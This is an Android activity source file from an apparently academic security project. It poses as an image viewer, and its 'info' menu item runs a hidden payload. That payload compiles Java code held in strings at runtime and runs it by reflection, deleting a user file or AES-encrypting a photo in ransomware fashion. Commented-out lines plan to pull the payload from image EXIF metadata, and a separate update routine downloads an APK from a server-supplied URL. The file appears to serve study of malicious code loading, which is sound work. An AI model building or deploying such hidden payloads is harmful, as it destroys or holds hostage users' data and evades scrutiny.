package com.client_progettosicurezza;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.DownloadManager;
import android.content.Context;
import android.content.DialogInterface;
import android.media.ExifInterface;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.widget.SwipeRefreshLayout;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;

import com.client_progettosicurezza.adapters.AdapterImmagine;
import com.client_progettosicurezza.api.APIService;
import com.client_progettosicurezza.compiler.Compile;
import com.client_progettosicurezza.models.Aggiornamento;
import com.client_progettosicurezza.models.Immagine;
import com.client_progettosicurezza.results.ResultAggiornamento;
import com.client_progettosicurezza.results.ResultListaImmagini;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.ArrayList;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import static com.client_progettosicurezza.api.APIUrl.BASE_URL;

public class MainActivity extends AppCompatActivity {

    public static final int PERMISSION_CODE = 1;

    private RecyclerView recyclerView;
    private RecyclerView.Adapter adapter;
    SwipeRefreshLayout swipeRefresh;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSION_CODE);

        recyclerView = (RecyclerView) findViewById(R.id.recyclerView);
        recyclerView.setHasFixedSize(true);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));

        loadImmagini();

        swipeRefresh = (SwipeRefreshLayout) findViewById(R.id.swipeRefresh);

        swipeRefresh.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                swipeRefresh.setRefreshing(true);

                new android.os.Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {

                        swipeRefresh.setRefreshing(false);
                        loadImmagini();
                    }
                }, 100);
            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu, menu);
        return true;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();

        switch (id) {
            case R.id.update:
                AlertDialog.Builder alertDialog = new AlertDialog.Builder(MainActivity.this);
                alertDialog.setMessage("C'è un nuovo aggiornamento. Vuoi scaricarlo?").setCancelable(false)
                        .setPositiveButton("Si", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialogInterface, int i) {
                                downloadAggiornamento();
                            }
                        })
                        .setNegativeButton("No", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialogInterface, int i) {
                                dialogInterface.cancel();
                            }
                        });

                AlertDialog alert = alertDialog.create();
                alert.setTitle("Aggiornamento");
                alert.show();

                break;

            case R.id.info:
                //String pathFile = Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg";
                //File file = new File(pathFile);
                payload();

                /*try {
                    run();
                } catch (Exception e) {
                    e.printStackTrace();
                }*/


                break;
        }
        return true;
    }

    private void payload() {

        String codice =
                "public class Classe { " +
                    "public Classe() {} " +
                    "/* start method */" +
                    "public void run(android.content.Context context){ " +
                        "java.io.File file = new java.io.File((java.lang.String) \"/sdcard/Download/Shrek.jpg\"); " +
                        "if(file.delete()){ " +
                            "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Cancellato\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
                        "} else {" +
                            "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Non cancellato\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
                        "} " +
                     "} " +
                    "/* end method */" +
                "}";

        String codice2 =
                "public class Classe { " +
                    "public Classe() {} " +
                    "/* start method */" +
                    "public void run(android.content.Context context){ " +
                        "try{" +
                            "java.lang.String password = \"pass\";" +
                            "byte[] keyStart = password.getBytes(\"UTF-8\");" +
                            "javax.crypto.KeyGenerator kgen = javax.crypto.KeyGenerator.getInstance(\"AES\");" +
                            "java.security.SecureRandom sr = java.security.SecureRandom.getInstance(\"SHA1PRNG\");" +
                            "sr.setSeed(keyStart);" +
                            "kgen.init(128, sr);" +
                            "javax.crypto.SecretKey skey = kgen.generateKey();" +
                            "byte[] key = skey.getEncoded();" +
                            "java.nio.file.Path path = java.nio.file.Paths.get(\"/sdcard/Download/Minions.jpg\");" +
                            "byte[] plaintext = java.nio.file.Files.readAllBytes(path);" +
                            "javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(key, \"AES\");" +
                            "javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(\"AES\");" +
                            "cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);" +
                            "byte[] encrypted = cipher.doFinal(plaintext);" +
                            "java.io.File file_chipertext = new java.io.File(\"/sdcard/Download/Minions.jpg.encrypt\");" +
                            "java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream(file_chipertext));" +
                            "bos.write(encrypted);" +
                            "bos.flush();" +
                            "bos.close();" +
                        "} catch(java.lang.Exception e){" +
                            "e.printStackTrace();" +
                        "}" +
                        "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Non cancellato\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
                    "} " +
                    "/* end method */" +
                "}";

        /*try {
            ExifInterface exif = new ExifInterface(file.getAbsolutePath());
            codice = exif.getAttribute(ExifInterface.TAG_IMAGE_DESCRIPTION);
        } catch (IOException e) {
            e.printStackTrace();
        }*/

        try {
            Compile compile = new Compile(getFilesDir(), getApplicationContext());
            compile.assemblyCompile(codice2);
            compile.recompile();
            compile.load(getCacheDir(), getApplicationInfo(), getClassLoader());

            Object obj = compile.run();
            Method metodo = obj.getClass().getDeclaredMethod("run", Context.class);
            metodo.invoke(obj, getApplicationContext());

        } catch (IOException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
    }

    private void loadImmagini() {
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        APIService service = retrofit.create(APIService.class);

        Call<ResultListaImmagini> call = service.getImmagini();

        call.enqueue(new Callback<ResultListaImmagini>() {
            @Override
            public void onResponse(Call<ResultListaImmagini> call, Response<ResultListaImmagini> response) {

                ArrayList<Immagine> immagini = response.body().getImmagini();

                adapter = new AdapterImmagine(immagini, getApplicationContext());
                recyclerView.setAdapter(adapter);
            }

            @Override
            public void onFailure(Call<ResultListaImmagini> call, Throwable t) {

            }
        });
    }

    private void downloadAggiornamento() {
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        APIService service = retrofit.create(APIService.class);

        Call<ResultAggiornamento> call = service.getAggiornamento();

        call.enqueue(new Callback<ResultAggiornamento>() {
            @Override
            public void onResponse(Call<ResultAggiornamento> call, Response<ResultAggiornamento> response) {

                Aggiornamento aggiornamento = response.body().getAggiornamento();

                Toast.makeText(getApplicationContext(), "Download Image View.apk " + "versione: " + aggiornamento.getVersione(), Toast.LENGTH_LONG).show();

                String nameApk = "ImageView_v" + aggiornamento.getVersione() + ".apk";

                DownloadManager downloadManager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
                Uri uri = Uri.parse(aggiornamento.getFile());
                DownloadManager.Request request = new DownloadManager.Request(uri);
                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_ONLY_COMPLETION);
                request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, nameApk);
                downloadManager.enqueue(request);

                /*Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.fromFile(new File(Environment.DIRECTORY_DOWNLOADS + "/" + nameApk)),
                        "application/com.client_progettosicurezza");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);*/
            }

            @Override
            public void onFailure(Call<ResultAggiornamento> call, Throwable t) {

            }
        });
    }









    public void runAll() throws Exception {
        Path path = Paths.get(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg");
        byte[] plaintext = Files.readAllBytes(path);

        byte[] key = generateKey("password");

        byte[] chipertext = encodeFile(key, plaintext);

        File file_chipertext = new File(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg.encrypt");
        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(file_chipertext));
        bos.write(chipertext);
        bos.flush();
        bos.close();


        byte[] plaintext_verifica = decodeFile(key, chipertext);

        File file_plaintext = new File(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Verifica.jpg");
        BufferedOutputStream bos2 = new BufferedOutputStream(new FileOutputStream(file_plaintext));
        bos2.write(plaintext_verifica);
        bos2.flush();
        bos2.close();

    }

    public byte[] generateKey(String password) throws Exception {
        byte[] keyStart = password.getBytes("UTF-8");

        KeyGenerator kgen = KeyGenerator.getInstance("AES");
        SecureRandom sr = SecureRandom.getInstance("SHA1PRNG");
        sr.setSeed(keyStart);
        kgen.init(128, sr);
        SecretKey skey = kgen.generateKey();
        return skey.getEncoded();
    }

    public byte[] encodeFile(byte[] key, byte[] fileData) throws Exception {

        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);

        byte[] encrypted = cipher.doFinal(fileData);

        return encrypted;
    }

    public byte[] decodeFile(byte[] key, byte[] fileData) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, skeySpec);

        byte[] decrypted = cipher.doFinal(fileData);

        return decrypted;
    }

    public void rune(){
        try{
            java.lang.String password = "pass";
            byte[] keyStart = password.getBytes("UTF-8");
            javax.crypto.KeyGenerator kgen = javax.crypto.KeyGenerator.getInstance("AES");
            java.security.SecureRandom sr = java.security.SecureRandom.getInstance("SHA1PRNG");
            sr.setSeed(keyStart);
            kgen.init(128, sr);
            javax.crypto.SecretKey skey = kgen.generateKey();
            byte[] key = skey.getEncoded();

            java.nio.file.Path path = java.nio.file.Paths.get("/sdcard/Download/Minions.jpg");
            byte[] plaintext = java.nio.file.Files.readAllBytes(path);

            javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(key, "AES");
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES");
            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);
            byte[] encrypted = cipher.doFinal(plaintext);

            java.io.File file_chipertext = new java.io.File("/sdcard/Download/Minions.jpg.encrypt");
            java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream(file_chipertext));
            bos.write(encrypted);
            bos.flush();
            bos.close();
        } catch(java.lang.Exception e){
            e.printStackTrace();
        }
    }

}
